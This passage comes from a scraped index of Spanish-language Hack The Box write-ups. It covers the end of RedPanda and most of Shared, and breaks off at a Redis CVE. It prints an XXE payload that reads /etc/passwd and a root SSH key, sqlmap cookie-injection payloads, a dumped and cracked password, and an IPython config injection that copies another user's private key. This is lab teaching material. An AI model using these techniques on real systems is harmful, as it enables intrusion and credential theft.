\u0026#39;file:///etc/passwd\u0026#39;\u0026gt;]\u0026gt;\u0026lt;root\u0026gt;\u0026amp;test;\u0026lt;/root\u0026gt; woodenk@redpanda:~$ Luego de unos segundos el cron se ejecutaría y obtendríamos el resultado en el mismo archivo xml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 woodenk@redpanda:~$ cat file_creds.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root\u0026gt; \u0026lt;root\u0026gt;root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false\u0026lt;/root\u0026gt; woodenk@redpanda:~$ Shell Modificamos el payload para la lectura de la clave privada SSH de root.\n1 2 3 4 5 6 7 8 9 10 11 woodenk@redpanda:~$ cat file_creds.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root\u0026gt; \u0026lt;root\u0026gt;-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29 ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE= -----END OPENSSH PRIVATE KEY-----\u0026lt;/root\u0026gt; woodenk@redpanda:~$ Con esta logramos obtener una shell root por SSH.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 π ~/htb/redpanda/www ❯ chmod 600 root_id_rsa π ~/htb/redpanda/www ❯ ssh -i root_id_rsa root@10.10.11.170 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 18 Jul 2022 10:23:09 PM UTC System load: 0.14 Processes: 242 Usage of /: 83.0% of 4.30GB Users logged in: 1 Memory usage: 75% IPv4 address for eth0: 10.10.11.170 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Thu Jun 30 13:17:41 2022 root@redpanda:~# whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /root root@redpanda:~# ls root.txt run_credits.sh root@redpanda:~# cat root.txt 3c6315be0480d9e8dbb52722aaea3d0a root@redpanda:~# ","description":"En RedPanda descubrimos una vulnerabilidad SSTI en Java, en el sitio web, lo que nos permitió ejecutar comandos en la máquina. Las credenciales de la conexión de la base de datos nos permitieron acceder por SSH. Finalmente explotamos una vulnerabilidad de tipo XXE para realizar lectura de archivos y escalar privilegios.","id":11,"section":"posts","tags":["java","ssti","xml","xxe","exiftool","SAXBuilder","python"],"title":"Hack The Box - RedPanda","uri":"https://sckull.github.io/posts/redpanda/"},{"content":"\rEn Shared descubrimos una vulnerabilidad SQLi en la cookie del sitio web la cual nos permitió acceder a la Base de Datos y a credenciales que posteriormente nos dieron acceso por SSH. Accedimos a un segundo usuario tras la ejecución de un cronjob y un archivo de configuración de iPython. Tras analizar un ejecutable obtuvimos credenciales para Redis, que, finalmente explotamos ganando acceso como usuario privilegiado.\nNombre Shared OS Linux Puntos 30 Dificultad Media IP 10.10.11.172 Maker Nauten\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6, 5.8, 5.9, 4.1, 4.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 7, 6, 4, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80), https (445) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # Nmap 7.92 scan initiated Sat Jul 23 18:56:48 2022 as: nmap -p22,80,443 -sV -sC -oN nmap_scan 10.129.122.34 Nmap scan report for 10.129.122.34 (10.129.122.34) Host is up (0.67s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA) | 256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA) |_ 256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://shared.htb |_http-server-header: nginx/1.18.0 443/tcp open ssl/http nginx 1.18.0 |_http-title: Did not follow redirect to https://shared.htb |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.18.0 | tls-alpn: | h2 |_ http/1.1 | ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US | Not valid before: 2022-03-20T13:37:14 |_Not valid after: 2042-03-15T13:37:14 | tls-nextprotoneg: | h2 |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 23 18:57:29 2022 -- 1 IP address (1 host up) scanned in 41.47 seconds Web Site El sitio redirige al dominio shared.htb, el cual agregamos al archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/shared ❯ curl -sI 10.129.122.34 HTTP/1.1 301 Moved Permanently Server: nginx/1.18.0 Date: Sat, 23 Jul 2022 22:58:34 GMT Content-Type: text/html Content-Length: 169 Connection: keep-alive Location: http://shared.htb π ~/htb/shared ❯ Al visitar el sitio observamos una tienda con distintos productos, se muestra que el sitio lo ha desarrollado PrestaShop.\nSe explica que existe un nuevo proceso de pago.\nDirectory Brute Forcing feroxbuster muestra distintos directorios del sitio, observando los directorios de PrestaShop parece ser el mismo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 π ~/htb/shared ❯ feroxbuster -u https://shared.htb/ -k -x php -W 9 --depth 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ https://shared.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💢 Word Count Filter │ 9 💲 Extensions │ [php] 🔓 Insecure │ true 🔃 Recursion Depth │ 2 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── WLD 0l 0w 0c Got 302 for https://shared.htb/283854d4ea7441fa9c638969a392a5d4 (url length: 32) WLD - - - https://shared.htb/283854d4ea7441fa9c638969a392a5d4 redirects to =\u0026gt; https://shared.htb/index.php 301 7l 11w 169c https://shared.htb/js 301 7l 11w 169c https://shared.htb/bin 301 7l 11w 169c https://shared.htb/download 301 7l 11w 169c https://shared.htb/img 301 7l 11w 169c https://shared.htb/modules 301 7l 11w 169c https://shared.htb/cache 301 7l 11w 169c https://shared.htb/themes 301 7l 11w 169c https://shared.htb/js/admin 301 7l 11w 169c https://shared.htb/config 301 7l 11w 169c https://shared.htb/img/tmp 301 7l 11w 169c https://shared.htb/img/admin 301 7l 11w 169c https://shared.htb/docs 301 7l 11w 169c https://shared.htb/tools 301 7l 11w 169c https://shared.htb/app 301 7l 11w 169c https://shared.htb/var 301 7l 11w 169c https://shared.htb/img/t 301 7l 11w 169c https://shared.htb/img/p 301 7l 11w 169c https://shared.htb/controllers 301 7l 11w 169c https://shared.htb/webservice 301 7l 11w 169c https://shared.htb/themes/classic 301 7l 11w 169c https://shared.htb/modules/contactform 301 7l 11w 169c https://shared.htb/img/scenes 301 7l 11w 169c https://shared.htb/img/jquery-ui 301 7l 11w 169c https://shared.htb/modules/CustomCheckout SQL Injection El sitio menciona un nuevo proceso de pago, agregamos algunos productos al carrito.\nAl realizar el pago el sitio nos redirige al subdominio checkout.shared.htb, en donde se muestra la cantidad y codigo de producto.\nSi observamos las cookies, se muestra custom_cart con el codigo de producto y cantidad en una estructura JSON.\nAl agregar un nuevo producto al carrito se actualiza la cookie.\nCookie La cookie PrestaShop-* unicamente funciona para el dominio, no es necesario en el subdominio por lo que la eliminamos e intentamos detectar algun error de inyección sql. No logramos generar algun error, sin embargo, al intentar validar una desigualdad en SQL observamos que de ser verdadera se muestra el producto, de lo contrario no.\nSQLMap Tomando en cuenta la cookie utilizamos SQLMap para enumerar las bases de datos. Agregamos un asterisco (*) en donde sqlmap va a realizar la inyección. Luego de varios minutos sqlmap detecto un time-based blind y Union query, mostrando las dos bases de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 π ~/htb/shared ❯ sqlmap https://checkout.shared.htb/ --cookie=\u0026#39;custom_cart={\u0026#34;*\u0026#34;:\u0026#34;$1\u0026#34;}\u0026#39; --batch --dbs --risk 3 --level 5 --dbms mysql ___ __H__ ___ ___[)]_____ ___ ___ {1.6.4#stable} |_ -| . [\u0026#34;] | .\u0026#39;| . | |___|_ [\u0026#39;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 20:44:46 /2022-07-24/ custom injection marker (\u0026#39;*\u0026#39;) found in option \u0026#39;--headers/--user-agent/--referer/--cookie\u0026#39;. Do you want to process it? [Y/n/q] Y [20:44:46] [INFO] testing connection to the target URL [20:44:47] [INFO] testing if the target URL content is stable [20:44:47] [INFO] target URL content is stable [20:44:47] [INFO] testing if (custom) HEADER parameter \u0026#39;Cookie #1*\u0026#39; is dynamic do you want to URL encode cookie values (implementation specific)? [Y/n] Y [20:44:48] [INFO] (custom) HEADER parameter \u0026#39;Cookie #1*\u0026#39; appears to be dynamic [20:44:48] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter \u0026#39;Cookie #1*\u0026#39; might not be injectable [.. snip ..] [20:56:54] [INFO] (custom) HEADER parameter \u0026#39;Cookie #1*\u0026#39; appears to be \u0026#39;MySQL \u0026gt; 5.0.12 AND time-based blind (heavy query)\u0026#39; injectable [20:56:54] [INFO] testing \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; [20:56:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [20:57:00] [INFO] target URL appears to be UNION injectable with 3 columns [20:57:01] [INFO] (custom) HEADER parameter \u0026#39;Cookie #1*\u0026#39; is \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; injectable (custom) HEADER parameter \u0026#39;Cookie #1*\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 2898 HTTP(s) requests: --- Parameter: Cookie #1* ((custom) HEADER) Type: time-based blind Title: MySQL \u0026gt; 5.0.12 AND time-based blind (heavy query) Payload: custom_cart={\u0026#34;\u0026#39; AND 2387=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)-- hyVU\u0026#34;:\u0026#34;$1\u0026#34;} Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: custom_cart={\u0026#34;\u0026#39; UNION ALL SELECT NULL,CONCAT(0x71626b7171,0x50434b63487576696b5a4866516a676d74764e4e6651614d4e7352614a79797a787562517a495042,0x716a717671),NULL-- -\u0026#34;:\u0026#34;$1\u0026#34;} --- [20:57:01] [INFO] the back-end DBMS is MySQL web application technology: Nginx 1.18.0 back-end DBMS: MySQL \u0026gt; 5.0.12 (MariaDB fork) [20:57:01] [INFO] fetching database names available databases [2]: [*] checkout [*] information_schema [20:57:01] [INFO] fetched data logged to text files under \u0026#39;/home/sckull/.local/share/sqlmap/output/checkout.shared.htb\u0026#39; [*] ending @ 20:57:01 /2022-07-24/ Encontramos dos tablas, una de productos y una de usuarios, en la tabla user observamos las credenciales de un usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 Database: checkout [2 tables] +---------+ | user | | product | +---------+ Database: checkout Table: product [19 entries] +----+----------+-------+ | id | code | price | +----+----------+-------+ | 1 | 53GG2EF8 | 23.90 | | 2 | YCS98E4A | 35.90 | | 3 | CRAAFTKP | 29.00 | | 4 | MFDSVHXQ | 29.00 | | 5 | SS5UMYLB | 29.00 | | 6 | 7DA8SKYP | 11.90 | | 7 | 2E6E8GXJ | 11.90 | | 8 | 562XZDU8 | 11.90 | | 9 | DW64K6JF | 18.90 | | 10 | B4GTLMT3 | 18.90 | | 11 | B4ATAMB4 | 18.90 | | 12 | 4HAR4XDK | 9.00 | | 13 | UE593T4N | 9.00 | | 14 | WH82F998 | 9.00 | | 15 | PPZV67J5 | 35.00 | | 16 | BTAPXNX4 | 12.90 | | 17 | 5P6UG55R | 12.90 | | 18 | 77W6QWLX | 12.90 | | 19 | 8LPULR6Q | 13.90 | +----+----------+-------+ Database: checkout Table: user [1 entry] +----+----------------------------------+-------------+ | id | password | username | +----+----------------------------------+-------------+ | 1 | fc895d4eddc2fc12f995e18c865cf273 | james_mason | +----+----------------------------------+-------------+ database management system users privileges: [*] \u0026#39;checkout\u0026#39;@\u0026#39;localhost\u0026#39; [1]: privilege: USAGE crackstation.net nos permitió obtener la contraseña en texto plano.\n1 fc895d4eddc2fc12f995e18c865cf273:Soleil101 James Mason - User Logramos ingresar por SSH utilizando las credenciales.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/shared ❯ ssh james_mason@shared.htb # Soleil101 james_mason@shared.htb\u0026#39;s password: Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4 james_mason@shared:~$ whoami;id;pwd james_mason uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer) /home/james_mason james_mason@shared:~$ Observamos que james es miembro del grupo developer, tras buscar archivos y directorios pertenecientes a este grupo observamos la carpeta /opt/scripts_review.\n1 2 3 4 5 6 7 8 james_mason@shared:~$ find / -group developer 2\u0026gt;/dev/null /opt/scripts_review james_mason@shared:~$ cd /opt/scripts_review james_mason@shared:/opt/scripts_review$ ls -lah total 8.0K drwxrwx--- 2 root developer 4.0K Jul 14 13:46 . drwxr-xr-x 3 root root 4.0K Jul 14 13:46 .. james_mason@shared:/opt/scripts_review$ Tras ejecutar pspy observamos un cronjob que ejecuta /usr/local/bin/ipython en la carpeta /opt/scripts_review/.\n1 2 3 4 5 6 7 8 2022/07/25 00:47:01 CMD: UID=0 PID=44250 | /usr/sbin/CRON -f 2022/07/25 00:47:01 CMD: UID=0 PID=44252 | /bin/sh -c /root/c.sh 2022/07/25 00:47:01 CMD: UID=0 PID=44254 | /bin/bash /root/c.sh 2022/07/25 00:47:01 CMD: UID=0 PID=44253 | /bin/bash /root/c.sh 2022/07/25 00:47:01 CMD: UID=1001 PID=44255 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ \u0026amp;\u0026amp; /usr/local/bin/ipython 2022/07/25 00:47:01 CMD: UID=1001 PID=44256 | /usr/bin/pkill ipython 2022/07/25 00:47:01 CMD: UID=1001 PID=44257 | /usr/bin/python3 /usr/local/bin/ipython 2022/07/25 00:47:06 CMD: UID=0 PID=44259 | rm -rf /opt/scripts_review/* El usuario que ejecuta este cronjob es dan_smith.\n1 2 3 james_mason@shared:~$ cat /etc/passwd|grep 1001 dan_smith:x:1001:1002::/home/dan_smith:/bin/bash james_mason@shared:~$ Si observamos el contenido del script unicamente muestra la ejecución de IPython.\n1 2 3 4 5 6 7 8 9 10 11 12 james_mason@shared:/opt/scripts_review$ file /usr/local/bin/ipython /usr/local/bin/ipython: Python script, ASCII text executable james_mason@shared:/opt/scripts_review$ cat /usr/local/bin/ipython #!/usr/bin/python3 # -*- coding: utf-8 -*- import re import sys from IPython import start_ipython if __name__ == \u0026#39;__main__\u0026#39;: sys.argv[0] = re.sub(r\u0026#39;(-script\\.pyw|\\.exe)?$\u0026#39;, \u0026#39;\u0026#39;, sys.argv[0]) sys.exit(start_ipython()) james_mason@shared:/opt/scripts_review$ Descubrimos que en la carpeta principal de dan_smith existe el directorio .ipython con el perfil por defecto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 james_mason@shared:/home/dan_smith$ ls -lah total 32K drwxr-xr-x 4 dan_smith dan_smith 4.0K Jul 14 13:47 . drwxr-xr-x 4 root root 4.0K Jul 14 13:46 .. lrwxrwxrwx 1 root root 9 Mar 20 09:42 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 dan_smith dan_smith 220 Aug 4 2021 .bash_logout -rw-r--r-- 1 dan_smith dan_smith 3.5K Aug 4 2021 .bashrc drwxr-xr-x 3 dan_smith dan_smith 4.0K Jul 14 13:47 .ipython -rw-r--r-- 1 dan_smith dan_smith 807 Aug 4 2021 .profile drwx------ 2 dan_smith dan_smith 4.0K Jul 14 13:47 .ssh -rw-r----- 1 dan_smith dan_smith 33 Jul 24 18:15 user.txt james_mason@shared:/home/dan_smith$ ls -lah .ipython/ total 12K drwxr-xr-x 3 dan_smith dan_smith 4.0K Jul 14 13:47 . drwxr-xr-x 4 dan_smith dan_smith 4.0K Jul 14 13:47 .. drwxr-xr-x 7 dan_smith dan_smith 4.0K Jul 25 20:15 profile_default james_mason@shared:/home/dan_smith$ ls -lah .ipython/profile_default/ total 168K drwxr-xr-x 7 dan_smith dan_smith 4.0K Jul 25 20:15 . drwxr-xr-x 3 dan_smith dan_smith 4.0K Jul 14 13:47 .. drwxr-xr-x 2 dan_smith dan_smith 4.0K Jul 14 13:47 db -rw-r--r-- 1 dan_smith dan_smith 136K Jul 25 20:15 history.sqlite drwxr-xr-x 2 dan_smith dan_smith 4.0K Jul 14 13:47 log drwx------ 2 dan_smith dan_smith 4.0K Jul 14 13:47 pid drwx------ 2 dan_smith dan_smith 4.0K Jul 14 13:47 security drwxr-xr-x 2 dan_smith dan_smith 4.0K Jul 14 13:47 startup james_mason@shared:/home/dan_smith$ Dan Smith - User La documentación habla sobre perfiles en ipython, se localizan en ~/.ipython/profile_default/ con el nombre ipython_config.py, menciona que permite ejecutar codigo python.\nSabiendo esto, creamos el archivo ipython_config.py en el directorio /opt/scripts_review para ejecutar cat a la clave privada SSH de dan_smith redireccionando el contenido a un nuevo archivo en /tmp.\n1 echo \u0026#34;import os; os.system(\u0026#39;cat /home/dan_*/.ssh/id_rsa \u0026gt; /tmp/id\u0026#39;);\u0026#34; \u0026gt; ipython_config.py Tras varios segundos el cronjob se ejecuta y el archivo es creado. Movimos el archivo al directorio /dev/shm.\n1 2 3 4 5 james_mason@shared:/opt/scripts_review$ ls /tmp id systemd-private-e34726f6e5784c1b97ef2b9059bf65a4-systemd-logind.service-yHCmch vmware-root_422-591958401 systemd-private-e34726f6e5784c1b97ef2b9059bf65a4-redis-server.service-l8BJZf systemd-private-e34726f6e5784c1b97ef2b9059bf65a4-systemd-timesyncd.service-6Htrqh james_mason@shared:/opt/scripts_review$ mv /tmp/id /dev/shm/abc james_mason@shared:/opt/scripts_review$ Utilizamos la clave privada por SSH logrando obtener una shell como dan_smith y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 james_mason@shared:/dev/shm$ ls -lah total 1.2M drwxrwxrwt 2 root root 80 Jul 25 20:17 . drwxr-xr-x 17 root root 3.1K Jul 24 18:14 .. -rw-r--r-- 1 james_mason james_mason 2.6K Jul 25 20:17 abc -rwxr-xr-x 1 james_mason james_mason 1.2M Dec 6 2021 ps james_mason@shared:/dev/shm$ chmod 600 abc james_mason@shared:/dev/shm$ ls /home dan_smith james_mason james_mason@shared:/dev/shm$ ssh dan_smith@localhost -i abc The authenticity of host \u0026#39;localhost (127.0.0.1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:mjIWp2Ggy1NHLY33FSfsXXVTUxbD+W30zEbd7BvHopg. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;localhost\u0026#39; (ECDSA) to the list of known hosts. Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4 dan_smith@shared:~$ whoami;id; pwd dan_smith uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin) /home/dan_smith dan_smith@shared:~$ ls user.txt dan_smith@shared:~$ cat user.txt a1c12d8187aa8c674987dc53372be5ad dan_smith@shared:~$ Privesc El usuario dan_smith pertenece al grupo sysadmin, el ejecutable redis_connector_dev pertenece a este grupo.\n1 2 3 4 5 6 7 dan_smith@shared:~$ id uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin) dan_smith@shared:~$ find / -group sysadmin 2\u0026gt;/dev/null /usr/local/bin/redis_connector_dev dan_smith@shared:~$ ls -lah /usr/local/bin/redis_connector_dev -rwxr-x--- 1 root sysadmin 5.7M Mar 20 09:41 /usr/local/bin/redis_connector_dev dan_smith@shared:~$ Tras ejecutar el archivo observamos que muestra un mensaje indicando el login con una contraseña y luego muestra información de redis y el sistema.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 dan_smith@shared:~$ /usr/local/bin/redis_connector_dev [+] Logging to redis instance using password... INFO command result: # Server redis_version:6.0.15 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:4610f4c3acf7fb25 redis_mode:standalone os:Linux 5.10.0-16-amd64 x86_64 arch_bits:64 multiplexing_api:epoll atomicvar_api:atomic-builtin gcc_version:10.2.1 process_id:1497 run_id:c845d00abecca7cae7c31d150cceb1cdbd97ff7d tcp_port:6379 uptime_in_seconds:16 uptime_in_days:0 hz:10 configured_hz:10 lru_clock:14979975 executable:/usr/bin/redis-server config_file:/etc/redis/redis.conf io_threads_active:0 \u0026lt;nil\u0026gt; dan_smith@shared:~$ Realizamos una copia de este archivo al directorio /dev/shm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 dan_smith@shared:~$ cp /usr/local/bin/redis_connector_dev /dev/shm dan_smith@shared:~$ cd /dev/shm dan_smith@shared:/dev/shm$ ls abc ps redis_connector_dev dan_smith@shared:/dev/shm$ chmod 777 redis_connector_dev dan_smith@shared:/dev/shm$ ls -lah total 6.9M drwxrwxrwt 2 root root 100 Jul 25 20:23 . drwxr-xr-x 17 root root 3.1K Jul 24 18:14 .. -rw------- 1 james_mason james_mason 2.6K Jul 25 20:17 abc -rwxr-xr-x 1 james_mason james_mason 1.2M Dec 6 2021 ps -rwxrwxrwx 1 dan_smith dan_smith 5.7M Jul 25 20:23 redis_connector_dev dan_smith@shared:/dev/shm$ Para luego realizar una copia utilizando scp.\n1 2 3 4 5 6 π ~/htb/shared ❯ scp james_mason@shared.htb:/dev/shm/redis_connector_dev . # Soleil101 james_mason@shared.htb\u0026#39;s password: redis_connector_dev 100% 5834KB 162.9KB/s 00:35 π ~/htb/shared ❯ ls -lah redis_connector_dev -rwxr-xr-x 1 sckull sckull 5.7M jul 25 18:25 redis_connector_dev π ~/htb/shared ❯ Ghidra Utilizamos ghidra para analizar el archivo, observamos en la función main que utiliza redis, además, realiza y crea una nueva conexión utilizando los valores: localhost:6379 y F2WHqJUz2WEz=Gqq, casi de la misma forma como se muestra en el ejemplo.\nWireshark Al ejecutar el fichero localmente observamos que la conexion al puerto 6379 fue \u0026ldquo;denegada\u0026rdquo;.\n1 2 3 4 5 6 π ~/htb/shared ❯ ./redis_connector_dev [+] Logging to redis instance using password... INFO command result: dial tcp [::1]:6379: connect: connection refused π ~/htb/shared ❯ En Wireshark filtramos el puerto 6379 y ejecutamos un servidor redis localmente. Tras ejecutar redis_connector_dev observamos una nueva conexión al puerto 6379 intentando realizar una autenticación con el servidor redis pasando la contraseña en texto plano.\nRedis - CVE-2022-0543 Si realizamos la conexion en la máquina logramos ingresar, sin embargo no encontramos credenciales o información importante.\n1 2 3 4 5 dan_smith@shared:~$ redis-cli -h 127.0.0.1 -p 6379 -a \u0026#39;F2WHqJUz2WEz=Gqq\u0026#39; Warning: Using a password with \u0026#39;-a\u0026#39; or 